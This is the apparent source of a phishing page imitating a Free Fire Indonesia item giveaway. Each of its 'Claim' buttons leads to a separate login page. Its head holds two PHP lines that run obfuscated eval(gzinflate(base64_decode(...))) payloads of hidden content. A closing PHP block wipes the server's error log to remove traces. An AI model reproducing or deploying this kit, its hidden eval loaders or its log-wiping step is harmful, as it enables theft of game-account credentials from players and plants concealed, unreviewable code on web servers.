<html>
<head>
<title>Free Fire Indonesia</title>
<link rel="shorcut icon" href="https://steemitimages.com/0x0/https://img.esteem.ws/ea34benr2i.jpg">
<link rel="stylesheet" href="css/raflipedia.css">
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9gVQ4dYFwwWSjIDZnLEWnxCjeSWFphJiwGPXr1jddIhOegiu1FwO5qRGvFXOdJZ4" crossorigin="anonymous">
<?php eval(gzinflate(base64_decode('jY9La8JAEMfvgXyHYRE2lvgolFISBG1NwYN9xNiLyLJNVnfbbBJ2J6Df3k2lYm89Dczv/5iZqkoxKzCgdYtNi+yz3e2EUdWehjDuxzC9CAplm5IfmTCmNvaMfc8hhkoLViqtMOgsF4cWujbHM3F6en+3pI5LwQthAvpUVygqHGTHRkS+h+KAI4m6jCGX3LiEyTp7Hjx0lh62Xy2vNFclTIB+i7xFza2St+PpvtsO81pTpzuwhqP0vQkQidhEoxGBIfTYKkk/knRDz5O9zJYJ3f4hafK+TlYZW6cLunWP9RphecV4KQy6TrJTh994iBq4WbzBrCiMsBYi2ICrcZ6rtOVrlrDZfJ7+9BDYkhi6S4OrX0LfIyl/VApzSUK4rgyB/Cu0H58A'))); ?>
<?php eval(gzinflate(base64_decode('c0jOL6jUcFCJd/P0cQ2OVq9Qj41WL8ktiM9LzE1Vj9VBk4GIaloDAA=='))); ?>
</head>

<style>
body { 
  background: url(http://freefiremobile-a.akamaihd.net/ffwebsite/images/wallpaper/pc/035.jpg) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
</style>

<body>

</br>

<center><img src="https://i.pinimg.com/originals/da/3f/b9/da3fb96a95610462f6fd616c7892a2e3.png"></center>

</br>

<div class="kotak">

<div class="row">
<div class="informasi"><strong>ELITE PASS</strong></div>
<div class="informasi"><strong>BUNDLE TEMPERED WILL</strong></div>
<div class="informasi"><strong>EMOTE HELLO</strong></div>
</div>

<div class="row">
<div class="informasi">
<p><img class="aligncenter size-full" src="img/item/x/uhuyuhu/zeel2.jpg" width="250px" height="300px"></p>
<button onclick="location.href='login.html'" class="btn btn-warning btn-block" style="background-color: #f2ef4f;border-color: #f2ef4f;border-radius: 0px; margin: 0px;">Claim</button>
</div>
<div class="informasi">
<p><img class="aligncenter size=50" src="img/item/x/uhuyuhu/zeel1.png" width="250px" height="300px"></p>
<button onclick="location.href='login.html'" class="btn btn-warning btn-block" style="background-color: #f2ef4f;border-color: #f2ef4f;border-radius: 0px; margin: 0px;">Claim</button>
</div>
<div class="informasi">
<p><img class="aligncenter size-full" src="img/item/x/uhuyuhu/zeel3.jpg" width="250px" height="300px"></p>
<button onclick="location.href='login.html'" class="btn btn-warning btn-block" style="background-color: #f2ef4f;border-color: #f2ef4f;border-radius: 0px; margin: 0px;">Claim</button>
</div>
</div>

<div class="row">
<div class="informasi"><strong>TAS JOKER</strong></div>
<div class="informasi"><strong>STAR OF THE NEW YEAR</strong></div>
<div class="informasi"><strong>CRATE PINK PARADISE</strong></div>
</div>

<div class="row">
<div class="informasi">
<p><img class="aligncenter size-full" src="img/item/x/uhuyuhu/zeel4.jpg" width="250px" height="300px"></p>
<button onclick="location.href='login.html'" class="btn btn-warning btn-block" style="background-color: #f2ef4f;border-color: #f2ef4f;border-radius: 0px; margin: 0px;">Claim</button>
</div>
<div class="informasi">
<p><img class="aligncenter size-full" src="img/item/x/uhuyuhu/zeel5.jpg" width="250px" height="300px"></p>
<button onclick="location.href='login.html'" class="btn btn-warning btn-block" style="background-color: #f2ef4f;border-color: #f2ef4f;border-radius: 0px; margin: 0px;">Claim</button>
</div>
<div class="informasi">
<p><img class="aligncenter size-full" src="img/item/x/uhuyuhu/zeel6.jpg" width="250px" height="300px"></p>
<button onclick="location.href='login.html'" class="btn btn-warning btn-block" style="background-color: #f2ef4f;border-color: #f2ef4f;border-radius: 0px; margin: 0px;">Claim</button>
</div>
</div>

<div class="row">
<div class="informasi"><strong>EMOTE HELLO</strong></div>
<div class="informasi"><strong>WINTERLANDS DANCER</strong></div>
<div class="informasi"><strong>LOOT CRATE AK47</strong></div>
</div>

<div class="row">
<div class="informasi">
<p><img class="aligncenter size-full" src="img/item/x/uhuyuhu/zeel7.jpg" width="250px" height="300px"></p>
<button onclick="location.href='login.html'" class="btn btn-warning btn-block" style="background-color: #f2ef4f;border-color: #f2ef4f;border-radius: 0px; margin: 0px;">Claim</button>
</div>
<div class="informasi">
<p><img class="aligncenter size-full" src="img/item/x/uhuyuhu/zeel8.jpg" width="250px" height="300px"></p>
<button onclick="location.href='login.html'" class="btn btn-warning btn-block" style="background-color: #f2ef4f;border-color: #f2ef4f;border-radius: 0px; margin: 0px;">Claim</button>
</div>
<div class="informasi">
<p><img class="aligncenter size-full" src="img/item/x/uhuyuhu/zeel9.jpg" width="250px" height="300px"></p>
<button onclick="location.href='login.html'" class="btn btn-warning btn-block" style="background-color: #f2ef4f;border-color: #f2ef4f;border-radius: 0px; margin: 0px;">Claim</button>
</div>
</div>

</div><!--- kotak --->
<?php
$clean = fopen('error_log', 'w');
fwrite($clean,'');
fclose($clean);
?>
</body>
</html>

<!--- RAFLIPEDIA INDONESIA | COPYRIGHT 2018 --->
<!--- DEAR SCRIPT KIDDIES, DO NOT REPLACE COPYRIGHT! APPRECIATE ME! --->